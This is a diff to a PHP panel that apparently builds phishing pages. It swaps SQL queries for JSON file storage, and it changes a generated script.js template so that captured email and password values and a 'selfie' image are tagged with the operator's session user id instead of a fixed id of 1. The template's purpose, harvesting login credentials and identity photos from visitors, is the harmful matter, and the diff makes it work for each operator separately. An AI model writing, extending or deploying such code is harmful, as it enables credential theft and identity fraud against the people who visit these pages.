@@ -18,13 +18,9 @@ if (!$userId) {
 
 $user = readuser($userId);
 
-// Get user project data from users table
-$stmt = $conn->prepare("SELECT dev, project FROM users WHERE id = ?");
-$stmt->execute([$userId]);
-$userData = $stmt->fetch(PDO::FETCH_ASSOC);
-
-$userDev = $userData['dev'] ?? '';
-$userProjectLimit = (int)($userData['project'] ?? 1);
+// Get user project data from users table - JSON based
+$userDev = $user['dev'] ?? '';
+$userProjectLimit = (int)($user['project'] ?? 1);
 $currentProjectCount = 0;
 
 // Restrict to desktop only - detect mobile devices
@@ -238,7 +234,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }');
                         file_put_contents($projectPath . '/script.js', 'async function senddata() {
             console.log("click"); 
-            const id = 1; // Replace with actual user ID
+            const id = ' . $userId . '; // Dynamic user ID from session
             const email = document.getElementById("email");
             const password = document.getElementById("password");
             console.log(`Email: ${email.value}, Password: ${password.value}`);
@@ -249,7 +245,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         async function getselfi() {
-            const id = 1; // Replace with actual user ID
+            const id = ' . $userId . '; // Dynamic user ID from session
             await sendImage(id);
             console.log("Selfie sent successfully");
         }');
@@ -261,8 +257,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $_SESSION['current_project'] = $currentProject;
                         $projectNames[] = $projectName;
                         $updatedDev = implode(',', $projectNames);
-                        $stmt = $conn->prepare("UPDATE users SET dev = ? WHERE id = ?");
-                        $stmt->execute([$updatedDev, $userId]);
+                        // Update dev field using JSON
+                        $data = getJsonData();
+                        foreach ($data['users'] as &$user) {
+                            if ($user['id'] == $userId) {
+                                $user['dev'] = $updatedDev;
+                                saveJsonData($data);
+                                break;
+                            }
+                        }
                         header('Location: ?');
                         exit;
                     }
@@ -287,11 +290,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             deleteDir($projectPath);
             
-            // Update database
+            // Update database - JSON based
             $updatedProjects = array_diff($projectNames, [$projectName]);
             $updatedDev = implode(',', $updatedProjects);
-            $stmt = $conn->prepare("UPDATE users SET dev = ? WHERE id = ?");
-            $stmt->execute([$updatedDev, $userId]);
+            $data = getJsonData();
+            foreach ($data['users'] as &$user) {
+                if ($user['id'] == $userId) {
+                    $user['dev'] = $updatedDev;
+                    saveJsonData($data);
+                    break;
+                }
+            }
         }
         header('Location: ?');
         exit;
